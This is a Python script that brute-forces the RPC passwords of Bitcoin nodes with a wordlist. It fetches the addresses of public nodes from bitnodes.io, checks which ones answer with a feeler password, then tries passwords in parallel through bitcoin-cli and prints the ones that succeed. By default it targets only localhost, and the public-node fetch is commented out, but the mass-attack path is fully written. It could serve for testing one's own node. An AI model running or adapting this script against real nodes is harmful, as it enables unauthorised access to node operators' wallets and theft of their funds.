import os
import subprocess as sp
import time

import requests

from tqdm import tqdm

BITCOIN_PATH = "E:/Programme/Bitcoin/daemon"
NODE_LIST_URL = 'https://bitnodes.io/api/v1/snapshots/latest/'
USE_IPV4 = True
USE_IPV6 = True
USE_ONION = False

WORDLIST_PATH = "wordlist.txt"
FEELER_PASSWORD = "test12345"  # test pw used for feeler connections to check IP:port
MAX_PASSWORD_BULK_TRIES_PER_SECOND = 100  # upper limit, probably not reached
PASSWORDS_TRIED_PER_BULK = 10  # tried at once per node

ERROR_TEXT_AUTH = "error: Authorization failed: Incorrect rpcuser or rpcpassword"
ERROR_TEXT_CONN = "'error: timeout on transient error: Could not connect to the server"

MAX_PROCESSES_AMOUNT = 500


def split_host_port(addr_str):
    """
    Helper Method that splits ip addresses into (Host, Port)-Tuples.
    The host part can be anything including IPv6 or .onion addresses.

    Example: "127.0.0.1:8333" will become ("127.0.0.1", 8333)

    :param addr_str: The address as string. Port has to be at the end, separated by ":"
    :return: The corresponding (Host, Port)-Tuple, with the host being a string and the port an integer
    """
    host, _, port = addr_str.rpartition(":")
    host = host.strip("[]")
    return host, int(port)


def chunks(lst, n):
    """
    Helper method to split a list into parts of size up to n

    :param lst: The list to split
    :param n: The maximum chunk size
    :return: A list of chunks of sizes up to n
    """
    chunk_list = []
    for i in range(0, len(lst), n):
        chunk_list.append(lst[i:i + n])
    return chunk_list


def read_wordlist(path):
    """
    Reads a wordlist from file

    :param path: The file path of the wordlist. Should contain one word per line
    :return: The wordlist ass list of words
    """
    words = []
    with open(path) as f:
        for line in f:
            words.append(line.strip())

    print(f"Read {len(words)} words from wordlist {path}")
    return words


def get_addresses():
    """
    Fetches a list of recent reachable peers of the Bitcoin Network.
    The addresses will be returned as a list of (Host, Port)-Tuples.
    Will filter for IPv4, IPv6 or Onion nodes depending on the globally set preferences.

    :return: The addresses as a list of (Host, Port)-Tuples
    """

    # load new data from bitnodes.io API
    response = requests.get(NODE_LIST_URL)
    peers = response.json()['nodes'].keys()
    print(f"Fetched a total of {len(peers)} node addresses from bitnodes.io")

    # filter address types
    ipv4_addr_list = list(filter(lambda addr: '.onion' not in addr and '[' not in addr and '.' in addr, peers))
    ipv6_addr_list = list(filter(lambda addr: '.onion' not in addr and '[' in addr and '.' not in addr, peers))
    onion_addr_list = list(filter(lambda addr: '.onion' in addr and '[' not in addr, peers))

    # save address types depending on globally set preferences
    addrs = []
    if USE_IPV4:
        addrs.extend(ipv4_addr_list)
    if USE_IPV6:
        addrs.extend(ipv6_addr_list)
    if USE_ONION:
        addrs.extend(onion_addr_list)

    # split addresses into (Host, Port)-Tuples
    return [split_host_port(a) for a in addrs]


def start_rpc_process(node, passwd):
    """
    Starts an RPC call to the given node using the given password.
    The call will be made through a newly created subprocess that will be returned by this method.
    This way, multiple calls can run in parallel.

    :param node: The node to call as (Host, Port)-Tuple
    :param passwd: The password to use for the call
    :return: The handler of the subprocess that was created
    """

    # The RPC commend used here does not really matter, we use "uptime" for simplicity.
    command = f"{os.path.join(BITCOIN_PATH, 'bitcoin-cli.exe')} " \
              f"-rpcconnect={node[0]} -rpcport={node[1] + 1} -rpcpassword={passwd} uptime"
    process = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
    return process


def parse_rpc_process_results(process):
    """
    Parses the data the process returnes upon finishing.
    Gives the return code, output and error message

    :param process: The process to read the output of
    :return: A (retcode, stdout, stderr)-Tuple
    """

    # the output of the call is split into a return code, error message, and output message
    res = process.communicate()  # returns a tuple (stdout, stderr)
    stdout = res[0].decode(encoding='utf-8')
    stderr = res[1].decode(encoding='utf-8')
    retcode = process.returncode  # 0 if ok, 1 otherwise
    return retcode, stdout, stderr


def check_connections(nodes):
    """
    Checks the connectivity of a bunch of bitcoin nodes at once.
    For this, "feeler connections" in the form of RPC calls will be made.
    These calls are expected to fail, but information is drawn from the error message.
    The error message can be used to distinguish between unreachable nodes and nodes that do,
    in principle, accept RPC calls with the right password.

    :param nodes: List of addresses as (Host, Port)-Tuples to check
    :return: A dict holding the reachability information
    """

    processes = []
    for n in nodes:
        processes.append((n, start_rpc_process(n, FEELER_PASSWORD)))

    reachable = {}
    for (n, p) in processes:
        p.wait()
        results = parse_rpc_process_results(p)

        # an error that states that the credentials are wrong hints to the node being generally reachable.
        # otherwise, an error message stating unreachability would have been returned
        if results[0] == 1 and ERROR_TEXT_AUTH in results[2]:
            reachable[n] = True
            print(f"   - Found node {n} to be reachable!")

    return reachable


def try_passwords(nodes, wordlist):
    """
    Tries out all passwords in the wordlist for all given nodes.
    All nodes will be probed in parallel, with one password at a time.
    Introduces artificial waiting times to ensure that no node is bombarded with probes to quickly.

    :param nodes: The list of nodes to probe, as (Host, Port)-Tuples
    :param wordlist: The wordlist as list of strings
    :return: a dict(node -> string) with passwords that were found to be correct
    """

    print(f"Trying out {len(wordlist)} passwords on {len(nodes)} nodes")
    last_check_time = dict.fromkeys(nodes, 0.0)
    recovered_pw = {}
    lost_nodes = {}  # saves nodes that can't be connected to anymore to save time on probing. Dict instead of list for performance reasons

    for pw_bulk in tqdm(chunks(wordlist, PASSWORDS_TRIED_PER_BULK)):
        processes = []
        for n in nodes:
            # flexible wait time based on tries per second parameter
            # ensures no node is bombarded with too password tries too fast
            time_to_wait = (1 / MAX_PASSWORD_BULK_TRIES_PER_SECOND) - time.time() - last_check_time[n]
            if time_to_wait > 0:
                time.sleep(time_to_wait)

            # start the password try
            for pw in pw_bulk:
                processes.append((n, pw, start_rpc_process(n, pw)))
            last_check_time[n] = time.time()

        for (n, pw, p) in processes:
            p.wait()
            results = parse_rpc_process_results(p)
            if results[0] == 0:
                print(f" - Success on password for node {n} = {pw}")
                recovered_pw[n] = pw
            elif results[0] == 1 and ERROR_TEXT_CONN in results[2]:
                lost_nodes[n] = True
                print(f" - Lost node {n} while probing for passwords")

    return recovered_pw


def crack_nodes():
    """
    Outlines the workflow of running a dictionary brute force attack on all Bitcoin nodes.
    1) Get set of addresses to try from bitnodes.io and wordlist from file
    2) probe reachability of all nodes
    3) brute force passwords for all reachable nodes
    """

    # Get set of addresses to try
    # addrs = get_addresses()
    addrs = [("127.0.0.1", 8333)]  # enter only addresses that you own here!

    # Get wordlist to try
    wordlist = read_wordlist(WORDLIST_PATH)

    # retrieved data
    recovered_pw = {}
    reachable_nodes = {}

    # probe reachability first
    c = chunks(addrs, MAX_PROCESSES_AMOUNT)
    for chunk in tqdm(c):
        reachable_nodes.update(check_connections(chunk))
    print(f"Found a total of {len(reachable_nodes)} new reachable nodes")

    # brute force passwords for all reachable nodes next
    recovered_pw.update(try_passwords([n for n in reachable_nodes if reachable_nodes[n]], wordlist))
    print(f"Recovered a total of {len(recovered_pw)} passwords: {recovered_pw}")


if __name__ == '__main__':
    crack_nodes()
